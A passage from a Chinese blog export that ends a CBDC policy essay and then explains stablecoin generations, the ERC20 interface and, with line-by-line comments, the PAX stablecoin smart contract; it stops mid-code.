<p>  笔者认为，实质上，中央银行对央行数字货币具有无可辩驳的控制权，央行数字货币对银行存款也并非就是完美的替代品，比如银行存款可以透支，而央行数字货币不行。而且商业银行也不是完全被动的，他们会对央行数字货币的优势做出反应。为了防止在计息的情况下央行数字货币对银行存款的替代，至少可以采取以下措施，增加银行存款向央行数字货币转化的摩擦和成本。一是央行可以参照实物现金管理条例对央行数字货币实施“均一化”管理，以此管控央行数字货币的大额持有，实质上就是管控大额取现。二是中央银行对银行存款向央行数字货币每日转账施加限额，不支付高于规定限额的余额的利息，降低大额央行数字货币的吸引力。三是商业银行引入大额央行数字货币提款通知期限，对可能接近现金存储成本的异常大额余额征收费用。四是商业银行提高银行存款吸引力，比如提高利息或改进服务。因此，无须对央行数字货币怀有“狭义银行”恐惧症。</p>
<p>  数字美元方案似乎也不在乎“狭义银行”，提出直接对数字美元计息，突破了当下各国央行数字货币实验暂不计息的谨慎思路。欧洲中央银行的数字欧元报告虽然强调应避免资金从银行存款突然转移到数字欧元而带来的相关风险，但它不反对数字欧元计息，提出所谓的分级计息系统（a tiered remuneration system),以可变的利率对不同数字欧元持有量计息，以减轻数字欧元对银行业、金融稳定和货币政策传导的潜在影响。</p>
<h2 id="九、央行数字货币的监管考量：实现隐私保护与监管合规的平衡"><a href="#九、央行数字货币的监管考量：实现隐私保护与监管合规的平衡" class="headerlink" title="九、央行数字货币的监管考量：实现隐私保护与监管合规的平衡"></a>九、央行数字货币的监管考量：实现隐私保护与监管合规的平衡</h2><p>  身份可信是现代经济社会稳定运行的基础。身份管理如此重要，以至于世界各国都将其作为最根本的社会治理制度之一。在我国，自殷商以来就有严密的户籍管理制度，是征兵、赋役、管制的基础。户籍管理不仅中国有，国外也同样有。外国的户籍管理多叫“民事登记”或“生命登记”、“人事登记”，叫法不一，但基本上与我国的户籍管理大同小异。如果说现实生活中的身份管理依托于人口登记，那么数字世界中的数字身份又该如何展开，如何维护，如何管控呢？目前的公私钥体系还有哪些需要改进的地方？这些都是央行数字货币必须研究的问题。</p>
<p>  央行数字货币赖以运行的一大技术支柱是密码算法。现有加密数字资产的纯置名方式会引发用户的财产损失风险，在央行数字货币体系中必须彻底解决。同时，在央行数字货币的用户体验上，也需要考虑用户个人隐私保护的需求，通过隐私保护技术确保用户数据的安全，避免敏感信息的泄露，且不损害可用性，为央行数字货币流通营造一个更为健康的使用环境，体现央行数字货币竞争优势。在央行数字货币监管方面，利用数字货币“前台自愿，后台实名”的特性，通过安全与隐私保护技术来管理相关数据使用权限，实现一定条件下的可追溯，确保大数据分析等监管科技有用武之地。</p>
<p>在笔者构建的“一币、两库、三中心”央行数字货币原型系统中，由央行通过认证中心对央行数字货币机构及用户身份信息进行集中管理，它是系统安全的基础组件，也是可控匿名设计的重要环节。登记中心则记录央行数字货币及对应用户身份，完成权属登记，并记录流水，完成央行数字货币产生、流通、清点核对及消亡全生命周期登记。这里的机制是认证中心和登记中心的数据若非监管和司法需要，不得随意匹配，要有防火墙来达成两方相关数据的隔离。数字身份的独立和严格管理，既可以提供公共服务，又意在保护用户隐私。</p>
<h2 id="十、结语"><a href="#十、结语" class="headerlink" title="十、结语"></a>十、结语</h2><p>  2017年，笔者曾撰文探讨数字法币的内涵与外延：“法定数字货币在价值上是信用货币，在技术上是加密货币，在实现上是算法货币，在应用场景上则是智能货币。与现有的私人数字货币和电子货币相比，法定数字货币将呈现全新、更好的品质。让货币价值更稳定，让数据更安全，让监管更强大，让个人的支付行为更灵动，让货币应用更智能，不仅能很好地服务大众，同时又能为经济调控提供有效手段，还能为监管科技的发展创造坚实的基础，这些优秀品质是中国法定数字货币所追求的目标。”</p>
<p>  时至今日，虽然各国“引而不发”，至今还没有出现真正意义上的央行数字货币，但无论是数字美元方案，还是数字美元计划白皮书，均表明美国已正式加入“火热的央行数字货币战局”。事实上，无论是虚拟货币监管，稳定币的市场化探索，还是美联储的“体制内”研究创新，都涉及本文探讨的央行数字货币关键考量，美国人均有多元化的选择，客观上为后继发展留出了极大的弹性空间。美国的入局将像催化剂一样，大大加速全球央行数字货币的研发，央行数字货币时代或不再遥远。作为大国，我们应在这一数字创新浪潮中迎头而上，积极有为。</p>
<p>  数字时代已然来临，数字货币时代也必将来临。</p>
]]></content>
      <tags>
        <tag>零知识证明</tag>
      </tags>
  </entry>
  <entry>
    <title>关于稳定代币的说明</title>
    <url>/2019/03/20/%E5%85%B3%E4%BA%8E%E7%A8%B3%E5%AE%9A%E4%BB%A3%E5%B8%81%E7%9A%84%E8%AF%B4%E6%98%8E/</url>
    <content><![CDATA[<h3 id="什么是稳定币"><a href="#什么是稳定币" class="headerlink" title="什么是稳定币"></a>什么是稳定币</h3><p>稳定币就是一种相对稳定的加密货币。这里的“稳定”主要是指价格稳定，即，在一段时间内的价格不会有大幅波动。</p>
<ol>
<li><p>第一代以USDT为代表稳定币，其特征是无监管、无透明、属于自说自话的一种。</p>
</li>
<li><p>第二代以TrueUSD为代表的稳定币，比USDT进了一步，它的在透明度上要比USDT好很多，因为TUSD宣称使用托管帐户作为基金管理中使用最广泛的合法工具，为持有人提供定期审计和强有力的法律保护，即多银行负责托管帐户、第三方出具帐户余额认证、团队绝不和存入的USDT直接打交道等等，所以不会出现裁判员和运动员于一身的情况。</p>
</li>
<li><p>第三代以GUSD和PAX为代表的稳定币，则更进一步，直接以美国国家信用为背书。2018年9月10日，纽约金融服务部（NYDFS）同时批准了两种基于以太坊-ERC20发行的稳定币，分别是 Gemini 公司发行的稳定币Gemini Dollar（GUSD），与Paxos公司发行的稳定币Paxos。Standard （PAX），每个稳定币都有 1 美元支撑。此外，还有两个非常突出的特点：<strong>一个是获得政府部门纽约金融服务部正式批准，成为第一个合规合法、接受监督的稳定币（也就意味着受到法律保护），信用背书大幅提升；另一个是基于以太坊的ERC20来发行的，这意味着财务相关数据完全公开透明、不可窜改，而且完全去中心化</strong>。那么理论上说，每一笔GUSD的增发都会有相应的资金入账。和完全中心化的稳定币对比，对于投资者来说，无疑更加具有可信度。</p>
</li>
</ol>
<p>但我们也应该看到，这次给GUSD颁发执照的，是NYDFS（纽约州金融服务部门），即一个地方金融部门。美国州级金融部门的监管并不意味着在全美有效，NYDFS（纽约州金融服务部门）上面还有SEC和美联储，这两个部门的态度才是决定稳定币未来的关键。而且GUSD目前只有25万美金上限的保额（GUSD发行的美元是存放在美国的在岸银行账户上的，这个账户适用FDIC的存款保险）。所以<strong>此次GUSD作为试点的目的很浓</strong>，就像我们国家一样，新东西慢慢来，先搞个试点，从中总结经验、完善相关法律法规，待成熟后逐步全面推广。</p>
<h3 id="关于ERC20代币"><a href="#关于ERC20代币" class="headerlink" title="关于ERC20代币"></a>关于ERC20代币</h3><p>如果问以太坊的智能合约应用最广泛的地方在哪里， 肯定就是发币了。 虽然可能V神也没想到世界还没被改变， ICO(圈钱)的方式倒是又多出了一个。</p>
<p>既然是数字token， 代码实现起来就可以有各种各样的方案。 实质无外乎就是记录下每个用户拥有的数字token数量， 具有转账，查询余额等功能就行了。 上面我们说到只要调用对应相关的函数去执行即可完成相关的功能。 可是这个时候假如某个ICO方A 写了代币转账功能， 它的转账函数叫做tx(uint256). 那么如果想调用它的转账就要调用tx这个函数， 我们知道只要调用函数不相同， input的内容就不会一样。 如果所有的ICO方写的这些函数名称均不一样。 调用者就要查看每一个ICO方的合约代码。 于是这个时候ERC20就来了， 它定义了一些发币(圈钱)的规范。也即是如果你想发行ICO， 最好按着我的规范来， 这样大家用起来就跟方便了。ERC20简而言之就是定义了下面几个接口</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">contract ERC20 &#123;</span><br><span class="line"></span><br><span class="line">  uint256 public totalSupply;</span><br><span class="line"></span><br><span class="line">  event Transfer(address indexed <span class="keyword">from</span>, address indexed to, uint256 value);  <span class="comment">// 转账触发</span></span><br><span class="line">  event Approval(address indexed owner, address indexed spender, uint256 value); <span class="comment">// 容许提取触发</span></span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">balanceOf</span>(<span class="params">address who</span>) <span class="title">public</span> <span class="title">view</span> <span class="title">returns</span> (<span class="params">uint256</span>)</span>;  <span class="comment">// 查询余额函数</span></span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">transfer</span>(<span class="params">address to, uint256 value</span>) <span class="title">public</span> <span class="title">returns</span> (<span class="params">bool</span>)</span>;   <span class="comment">// 进行转账函数</span></span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">approve</span>(<span class="params">address spender, uint256 value</span>) <span class="title">public</span> <span class="title">returns</span> (<span class="params">bool</span>)</span>;   <span class="comment">// 容许某个地址提款</span></span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">transferFrom</span>(<span class="params">address <span class="keyword">from</span>, address to, uint256 value</span>) <span class="title">public</span> <span class="title">returns</span> (<span class="params">bool</span>)</span>;  <span class="comment">// 从一方向另一方转账的余额</span></span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>有了这个规范， 各个ICO方在发行token时都实现上面的接口， 这样无论任何的ERC20代币， 均可以用一套方法实现所有代币转账,查询余额等功能。</p>
<h3 id="分析一下PAX稳定币的智能合约代码"><a href="#分析一下PAX稳定币的智能合约代码" class="headerlink" title="分析一下PAX稳定币的智能合约代码"></a>分析一下<a href="https://etherscan.io/address/0x8e870d67f660d95d5be530380d0ec0bd388289e1#code">PAX稳定币的智能合约代码</a></h3><figure class="highlight js"><table><tr><td class="code"><pre><span class="line">pragma solidity ^<span class="number">0.4</span><span class="number">.24</span>;</span><br><span class="line">pragma experimental <span class="string">&quot;v0.5.0&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 导入外部包  此包中主要是一些</span></span><br><span class="line"><span class="comment">// 安全的数学运算 </span></span><br><span class="line"><span class="comment">// 因为在一些场景 出现了数据溢出没有考虑的问题导致了</span></span><br><span class="line"><span class="comment">// 一些ico币直接归零</span></span><br><span class="line"><span class="keyword">import</span> <span class="string">&quot;./zeppelin/SafeMath.sol&quot;</span>;</span><br><span class="line"></span><br><span class="line">contract PAXImplementation &#123;</span><br><span class="line"></span><br><span class="line">    using SafeMath <span class="keyword">for</span> uint256;</span><br><span class="line">    bool private initialized = <span class="literal">false</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 定义了ERC20规定的代币名称 符号 精度</span></span><br><span class="line">    mapping(<span class="function"><span class="params">address</span> =&gt;</span> uint256) internal balances;</span><br><span class="line">    uint256 internal totalSupply_;</span><br><span class="line">    string public constant name = <span class="string">&quot;PAX&quot;</span>; <span class="comment">// solium-disable-line uppercase</span></span><br><span class="line">    string public constant symbol = <span class="string">&quot;PAX&quot;</span>; <span class="comment">// solium-disable-line uppercase</span></span><br><span class="line">    uint8 public constant decimals = <span class="number">18</span>; <span class="comment">// solium-disable-line uppercase</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// ERC20 DATA</span></span><br><span class="line">    mapping (<span class="function"><span class="params">address</span> =&gt;</span> mapping (<span class="function"><span class="params">address</span> =&gt;</span> uint256)) internal allowed;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// OWNER DATA</span></span><br><span class="line">    address public owner;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// PAUSABILITY DATA</span></span><br><span class="line">    bool public paused = <span class="literal">false</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// LAW ENFORCEMENT DATA</span></span><br><span class="line">    address public lawEnforcementRole;</span><br><span class="line">    mapping(<span class="function"><span class="params">address</span> =&gt;</span> bool) internal frozen;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// SUPPLY CONTROL DATA</span></span><br><span class="line">    address public supplyController;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 定义触发时间  当转账或者授权别人转账时 调用此事件  当调用时 其实质会在以太坊节点区块上写入日志。</span></span><br><span class="line">    event Transfer(address indexed <span class="keyword">from</span>, address indexed to, uint256 value);</span><br><span class="line">    event Approval(</span><br><span class="line">        address indexed owner,</span><br><span class="line">        address indexed spender,</span><br><span class="line">        uint256 value</span><br><span class="line">    );</span><br><span class="line"></span><br><span class="line">    <span class="comment">// OWNABLE EVENTS</span></span><br><span class="line">    event OwnershipTransferred(</span><br><span class="line">        address indexed oldOwner,</span><br><span class="line">        address indexed newOwner</span><br><span class="line">    );</span><br><span class="line"></span><br><span class="line">    <span class="comment">// PAUSABLE EVENTS</span></span><br><span class="line">    event Pause();</span><br><span class="line">    event Unpause();</span><br><span class="line"></span><br><span class="line">    <span class="comment">// LAW ENFORCEMENT EVENTS</span></span><br><span class="line">    event AddressFrozen(address indexed addr);</span><br><span class="line">    event AddressUnfrozen(address indexed addr);</span><br><span class="line">    event FrozenAddressWiped(address indexed addr);</span><br><span class="line">    event LawEnforcementRoleSet (</span><br><span class="line">        address indexed oldLawEnforcementRole,</span><br><span class="line">        address indexed newLawEnforcementRole</span><br><span class="line">    );</span><br><span class="line"></span><br><span class="line">    <span class="comment">// SUPPLY CONTROL EVENTS</span></span><br><span class="line">    event SupplyIncreased(address indexed to, uint256 value);</span><br><span class="line">    event SupplyDecreased(address indexed <span class="keyword">from</span>, uint256 value);</span><br><span class="line">    event SupplyControllerSet(</span><br><span class="line">        address indexed oldSupplyController,</span><br><span class="line">        address indexed newSupplyController</span><br><span class="line">    );</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * FUNCTIONALITY</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// INITIALIZATION FUNCTIONALITY</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">    合约部署时的初始化过程</span></span><br><span class="line"><span class="comment">    设置合约拥有者为部署合约的账户</span></span><br><span class="line"><span class="comment">    设置总供应量为0</span></span><br><span class="line"><span class="comment">    并保证此函数只会被调用一次</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">initialize</span>(<span class="params"></span>) <span class="title">public</span> </span>&#123;</span><br><span class="line">        <span class="built_in">require</span>(!initialized, <span class="string">&quot;already initialized&quot;</span>);</span><br><span class="line">        owner = msg.sender;</span><br><span class="line">        lawEnforcementRole = address(<span class="number">0</span>);</span><br><span class="line">        totalSupply_ = <span class="number">0</span>;</span><br><span class="line">        supplyController = msg.sender;</span><br><span class="line">        initialized = <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">    合约的构造函数 调用上面的初始化函数 并且设置暂停交易 </span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="title">constructor</span>(<span class="params"></span>) <span class="title">public</span> &#123;</span><br><span class="line">        initialize();</span><br><span class="line">        pause();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// ERC20 BASIC FUNCTIONALITY</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">    ERC20接口 返回总的供应量</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">totalSupply</span>(<span class="params"></span>) <span class="title">public</span> <span class="title">view</span> <span class="title">returns</span> (<span class="params">uint256</span>) </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> totalSupply_;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">    转账函数 实现将调用者的token转给其他人</span></span><br><span class="line"><span class="comment">    msg.sender 即为合约的调用者 </span></span><br><span class="line"><span class="comment">    并且此函数要求必须是非暂停状态  即whenNotPaused返回真</span></span><br><span class="line"><span class="comment">    </span></span><br><span class="line"><span class="comment">    这个函数有需要验证条件 </span></span><br><span class="line"><span class="comment">    1.交易没有被暂停</span></span><br><span class="line"><span class="comment">    2.接收方地址不能是0</span></span><br><span class="line"><span class="comment">    3.接收方和发起方均不可以是冻结地址</span></span><br><span class="line"><span class="comment">    4.转账的token余额要足够。</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">transfer</span>(<span class="params">address _to, uint256 _value</span>) <span class="title">public</span> <span class="title">whenNotPaused</span> <span class="title">returns</span> (<span class="params">bool</span>) </span>&#123;</span><br><span class="line">        <span class="built_in">require</span>(_to != address(<span class="number">0</span>), <span class="string">&quot;cannot transfer to address zero&quot;</span>);</span><br><span class="line">        <span class="built_in">require</span>(!frozen[_to] &amp;&amp; !frozen[msg.sender], <span class="string">&quot;address frozen&quot;</span>);</span><br><span class="line">        <span class="built_in">require</span>(_value &lt;= balances[msg.sender], <span class="string">&quot;insufficient funds&quot;</span>);</span><br><span class="line"></span><br><span class="line">        balances[msg.sender] = balances[msg.sender].sub(_value);</span><br><span class="line">        balances[_to] = balances[_to].add(_value);</span><br><span class="line">        emit Transfer(msg.sender, _to, _value);</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">    ERC20接口 返回某个账户的token余额</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">balanceOf</span>(<span class="params">address _addr</span>) <span class="title">public</span> <span class="title">view</span> <span class="title">returns</span> (<span class="params">uint256</span>) </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> balances[_addr];</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// ERC20 FUNCTIONALITY</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">      ERC20接口 实现了 _from地址下容许调用方可以转出金额到其他_to</span></span><br><span class="line"><span class="comment">      此函数要求必须是非暂停状态</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">transferFrom</span>(<span class="params"></span></span></span><br><span class="line"><span class="function"><span class="params">        address _from,</span></span></span><br><span class="line"><span class="function"><span class="params">        address _to,</span></span></span><br><span class="line"><span class="function"><span class="params">        uint256 _value</span></span></span><br><span class="line"><span class="function"><span class="params">    </span>)</span></span><br><span class="line"><span class="function">    <span class="title">public</span></span></span><br><span class="line"><span class="function">    <span class="title">whenNotPaused</span></span></span><br><span class="line"><span class="function">    <span class="title">returns</span> (<span class="params">bool</span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="built_in">require</span>(_to != address(<span class="number">0</span>), <span class="string">&quot;cannot transfer to address zero&quot;</span>);</span><br><span class="line">        <span class="built_in">require</span>(!frozen[_to] &amp;&amp; !frozen[_from] &amp;&amp; !frozen[msg.sender], <span class="string">&quot;address frozen&quot;</span>);</span><br><span class="line">        <span class="built_in">require</span>(_value &lt;= balances[_from], <span class="string">&quot;insufficient funds&quot;</span>);</span><br><span class="line">        <span class="built_in">require</span>(_value &lt;= allowed[_from][msg.sender], <span class="string">&quot;insufficient allowance&quot;</span>);</span><br><span class="line"></span><br><span class="line">        balances[_from] = balances[_from].sub(_value);</span><br><span class="line">        balances[_to] = balances[_to].add(_value);</span><br><span class="line">        allowed[_from][msg.sender] = allowed[_from][msg.sender].sub(_value);</span><br><span class="line">        emit Transfer(_from, _to, _value);</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">      ERC20接口 实现调用方容许_spender 可以从我的账户转出的金额  这个函数和上面的函数是相对应的。</span></span><br><span class="line"><span class="comment">      只有一个账户容许了其他账户能从我的账户转出的金额 上述的函数才能转账成功。</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">approve</span>(<span class="params">address _spender, uint256 _value</span>) <span class="title">public</span> <span class="title">whenNotPaused</span> <span class="title">returns</span> (<span class="params">bool</span>) </span>&#123;</span><br><span class="line">        <span class="built_in">require</span>(!frozen[_spender] &amp;&amp; !frozen[msg.sender], <span class="string">&quot;address frozen&quot;</span>);</span><br><span class="line">        allowed[msg.sender][_spender] = _value;</span><br><span class="line">        emit Approval(msg.sender, _spender, _value);</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">    ERC20接口 返回_owner账户容许_spender账户从自己名下转移出去的资产数量</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">allowance</span>(<span class="params"></span></span></span><br><span class="line"><span class="function"><span class="params">        address _owner,</span></span></span><br><span class="line"><span class="function"><span class="params">        address _spender</span></span></span><br><span class="line"><span class="function"><span class="params">    </span>)</span></span><br><span class="line"><span class="function">    <span class="title">public</span></span></span><br><span class="line"><span class="function">    <span class="title">view</span></span></span><br><span class="line"><span class="function">    <span class="title">returns</span> (<span class="params">uint256</span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> allowed[_owner][_spender];</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// OWNER FUNCTIONALITY</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     这个函数被称为修饰函数 上面的whenNotPaused 也是一个修饰函数  实质是一种断言。 只有</span></span><br><span class="line"><span class="comment">     断言通过 才会执行函数内部的内容</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    modifier <span class="function"><span class="title">onlyOwner</span>(<span class="params"></span>)</span> &#123;</span><br><span class="line">        <span class="built_in">require</span>(msg.sender == owner, <span class="string">&quot;onlyOwner&quot;</span>);</span><br><span class="line">        _;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">    将只能合约的拥有者转给别人</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">transferOwnership</span>(<span class="params">address _newOwner</span>) <span class="title">public</span> <span class="title">onlyOwner</span> </span>&#123;</span><br><span class="line">        <span class="built_in">require</span>(_newOwner != address(<span class="number">0</span>), <span class="string">&quot;cannot transfer ownership to address zero&quot;</span>);</span><br><span class="line">        emit OwnershipTransferred(owner, _newOwner);</span><br><span class="line">        owner = _newOwner;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// PAUSABILITY FUNCTIONALITY</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     *  修饰函数 要求处于非暂停交易状态</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    modifier <span class="function"><span class="title">whenNotPaused</span>(<span class="params"></span>)</span> &#123;</span><br><span class="line">        <span class="built_in">require</span>(!paused, <span class="string">&quot;whenNotPaused&quot;</span>);</span><br><span class="line">        _;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 只有合约的拥有者才可以设置暂停交易</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">pause</span>(<span class="params"></span>) <span class="title">public</span> <span class="title">onlyOwner</span> </span>&#123;</span><br><span class="line">        <span class="built_in">require</span>(!paused, <span class="string">&quot;already paused&quot;</span>);</span><br><span class="line">        paused = <span class="literal">true</span>;</span><br><span class="line">        emit Pause();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 只有合约的拥有者才能取消暂停交易</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">unpause</span>(<span class="params"></span>) <span class="title">public</span> <span class="title">onlyOwner</span> </span>&#123;</span><br><span class="line">        <span class="built_in">require</span>(paused, <span class="string">&quot;already unpaused&quot;</span>);</span><br><span class="line">        paused = <span class="literal">false</span>;</span><br><span class="line">        emit Unpause();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// LAW ENFORCEMENT FUNCTIONALITY</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     设置一个法定的的强制角色 这个角色可以冻结或者解冻别人账户的token</span></span><br><span class="line"><span class="comment">     设置一个这样的角色要求首先调用方要么是合约的拥有者 要么自己已经是法定的强制者</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param </span>_newLawEnforcementRole The new address allowed to freeze/unfreeze addresses and seize their tokens.</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">setLawEnforcementRole</span>(<span class="params">address _newLawEnforcementRole</span>) <span class="title">public</span> </span>&#123;</span><br><span class="line">        <span class="built_in">require</span>(msg.sender == lawEnforcementRole || msg.sender == owner, <span class="string">&quot;only lawEnforcementRole or Owner&quot;</span>);</span><br><span class="line">        emit LawEnforcementRoleSet(lawEnforcementRole, _newLawEnforcementRole);</span><br><span class="line">        lawEnforcementRole = _newLawEnforcementRole;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 断言函数 要求调用方必须是强制者角色</span></span><br><span class="line">    modifier <span class="function"><span class="title">onlyLawEnforcementRole</span>(<span class="params"></span>)</span> &#123;</span><br><span class="line">        <span class="built_in">require</span>(msg.sender == lawEnforcementRole, <span class="string">&quot;onlyLawEnforcementRole&quot;</span>);</span><br><span class="line">        _;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">      冻结某个账户的token  使用了断言 onlyLawEnforcementRole 也是只有调用方角色是</span></span><br><span class="line"><span class="comment">      法定强制者才有权限冻结别人的token</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">freeze</span>(<span class="params">address _addr</span>) <span class="title">public</span> <span class="title">onlyLawEnforcementRole</span> </span>&#123;</span><br><span class="line">        <span class="built_in">require</span>(!frozen[_addr], <span class="string">&quot;address already frozen&quot;</span>);</span><br><span class="line">        frozen[_addr] = <span class="literal">true</span>;</span><br><span class="line">        emit AddressFrozen(_addr);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">        解冻某个账户的token  使用了断言 onlyLawEnforcementRole 也是只有调用方角色是</span></span><br><span class="line"><span class="comment">      法定强制者才有权限解冻别人的token</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">unfreeze</span>(<span class="params">address _addr</span>) <span class="title">public</span> <span class="title">onlyLawEnforcementRole</span> </span>&#123;</span><br><span class="line">        <span class="built_in">require</span>(frozen[_addr], <span class="string">&quot;address already unfrozen&quot;</span>);</span><br><span class="line">        frozen[_addr] = <span class="literal">false</span>;</span><br><span class="line">        emit AddressUnfrozen(_addr);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">    摧毁冻结账户的token 也就是说如果这个地址是一个冻结地址调用这个函数会把这个地址的token销毁同时总供应数量也会被减少</span></span><br><span class="line"><span class="comment">    当然这个函数也不是谁都可以调用的 只有法定的强制者才有权限</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">wipeFrozenAddress</span>(<span class="params">address _addr</span>) <span class="title">public</span> <span class="title">onlyLawEnforcementRole</span> </span>&#123;</span><br><span class="line">        <span class="built_in">require</span>(frozen[_addr], <span class="string">&quot;address is not frozen&quot;</span>);</span><br><span class="line">        uint256 _balance = balances[_addr];</span><br><span class="line">        balances[_addr] = <span class="number">0</span>;</span><br><span class="line">        totalSupply_ = totalSupply_.sub(_balance);</span><br><span class="line">        emit FrozenAddressWiped(_addr);</span><br><span class="line">        emit SupplyDecreased(_addr, _balance);</span><br><span class="line">        emit Transfer(_addr, address(<span class="number">0</span>), _balance);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">    用于检查某个地址是否被冻结了</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">isFrozen</span>(<span class="params">address _addr</span>) <span class="title">public</span> <span class="title">view</span> <span class="title">returns</span> (<span class="params">bool</span>) </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> frozen[_addr];</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// SUPPLY CONTROL FUNCTIONALITY</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">    设置token供应量的控制着 在合约初始化时 token供应量是合约发起则  调用这个函数可以更改</span></span><br><span class="line"><span class="comment">    这个函数只有调用方已经是token供应量控制着或者整个合约的拥有者才能调用成功</span></span><br><span class="line"><span class="comment">    也就是在整个合约中 合约的拥有者实质是可以控制一切权限的。 它能更改法定强制者 更改总token</span></span><br><span class="line"><span class="comment">    供应量的控制者。</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">setSupplyController</span>(<span class="params">address _newSupplyController</span>) <span class="title">public</span> </span>&#123;</span><br><span class="line">        <span class="built_in">require</span>(msg.sender == supplyController || msg.sender == owner, <span 